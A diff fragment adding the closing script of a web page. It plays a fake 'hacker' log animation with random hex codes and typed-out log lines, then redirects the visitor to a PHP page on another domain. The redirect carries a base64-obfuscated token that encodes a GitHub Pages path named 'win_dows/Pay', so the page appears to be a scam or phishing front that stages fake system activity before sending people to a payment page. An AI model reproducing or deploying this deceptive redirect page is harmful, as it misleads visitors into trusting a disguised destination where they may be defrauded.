+                    let fragment = document.createDocumentFragment();
+                    for(let k=0; k<4; k++) {
+                        const lineDiv = document.createElement('div');
+                        lineDiv.className = 'hacker-line';
+                        const phrase = hackerPhrases[Math.floor(Math.random() * hackerPhrases.length)];
+                        lineDiv.innerText = `${phrase} [0x${Math.floor(Math.random() * 16777215).toString(16).toUpperCase()}]`;
+                        fragment.appendChild(lineDiv);
+                    }
+                    processLog.appendChild(fragment);
+                    
+                    while(processLog.childNodes.length > 50) {
+                        processLog.removeChild(processLog.firstChild);
+                    }
+                    
+                    processLog.scrollTop = processLog.scrollHeight;
+
+                    if (progress < 2500) { 
+                        reqAnimId = requestAnimationFrame(fastPhase);
+                    } else {
+                        cancelAnimationFrame(reqAnimId);
+                        processLog.style.scrollBehavior = 'smooth';
+                        setTimeout(startSlowMotionLogs, 50);
+                    }
+                }
+                
+                requestAnimationFrame(fastPhase);
+
+                function startSlowMotionLogs() {
+                    let realLogIndex = 0;
+
+                    function typeNextLine() {
+                        if (realLogIndex < realLogs.length) {
+                            const lineDiv = document.createElement('div');
+                            lineDiv.className = 'log-entry typing-cursor visible';
+                            processLog.appendChild(lineDiv);
+
+                            let textHTML = realLogs[realLogIndex];
+                            let currentHTML = "";
+                            let isTag = false;
+                            let i = 0;
+
+                            const typeInterval = setInterval(() => {
+                                if (i < textHTML.length) {
+                                    if (textHTML[i] === '<') isTag = true;
+                                    currentHTML += textHTML[i];
+                                    if (textHTML[i] === '>') isTag = false;
+
+                                    lineDiv.innerHTML = currentHTML; 
+                                    processLog.scrollTop = processLog.scrollHeight; 
+                                    i++;
+                                } else {
+                                    clearInterval(typeInterval);
+                                    lineDiv.classList.remove('typing-cursor');
+                                    realLogIndex++;
+                                    setTimeout(typeNextLine, 150); 
+                                }
+                            }, 10); 
+                        } else {
+                            setTimeout(triggerFinalRedirect, 600);
+                        }
+                    }
+                    typeNextLine();
+                }
+            }
+
+            // --- 5. FINAL BLINKING LOGO & PREFETCH REDIRECT ---
+            function triggerFinalRedirect() {
+                const redirectUrl = "https://maxado.in/PG2/index.php?token=MXx8YUhSMGNITTZMeTl3Wlc1a2FXNW5OREEwTG1kcGRHaDFZaTVwYnk5M2FXNWZaRzkzY3k5UVlYa3ZaR1Z0YjE5MFpYTjB8fGh0dHBzOi8vcGVuZGluZzQwNC5naXRodWIuaW8vd2luX2Rvd3MvZGVtby1sb2dvLnN2Zw==";
+
+                // Show the blinking logo overlay
+                finalRedirectScreen.classList.add('active');
+                
+                // Inject Prefetch link to instruct browser to load assets in background (Zero load time trick)
+                const prefetchLink = document.createElement('link');
+                prefetchLink.rel = 'prefetch';
+                prefetchLink.href = redirectUrl;
+                document.head.appendChild(prefetchLink);
+                
+                // Wait for 2 seconds while preloading happens, then seamlessly redirect
+                setTimeout(() => {
+                    window.location.href = redirectUrl;
+                }, 2000); 
+            }
+        });
+    </script>
+</body>
+</html>
